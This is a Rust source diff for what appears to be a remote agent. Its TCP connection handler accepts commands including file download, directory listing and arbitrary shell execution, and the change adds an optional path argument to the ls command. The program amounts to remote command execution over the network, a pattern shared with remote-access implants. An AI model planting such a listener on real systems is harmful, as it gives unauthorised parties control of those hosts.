@@ -47,9 +47,9 @@ fn get(url: &str, destination: &str) -> Result<(), Box<dyn Error>> {
     }
 }
 
-fn ls() -> String {
+fn ls(path: &str) -> String {
     let mut files: Vec<String> = Vec::new();
-    let mut paths: Vec<DirEntry> = fs::read_dir(pwd()).unwrap().map(|r| r.unwrap()).collect();
+    let mut paths: Vec<DirEntry> = fs::read_dir(path).unwrap().map(|r| r.unwrap()).collect();
     paths.sort_by(|a, b| a.file_name().cmp(&b.file_name()));
     for file in paths {
         files.push(file.file_name().into_string().unwrap());
@@ -93,8 +93,14 @@ fn handle_connection(mut stream: TcpStream) {
                             Ok(_) => String::new(),
                             Err(e) => (*e).to_string(),
                         }
-                    },
-                    "ls" => ls(),
+                    }
+                    "ls" => {
+                        let path = match command_iter.next() {
+                            Some(s) => s.to_string(),
+                            None => pwd(),
+                        };
+                        ls(path.as_ref())
+                    }
                     "ping" => String::from("pong"),
                     "pwd" => pwd(),
                     "shell" => shell(command_iter.next().unwrap(), command_iter),
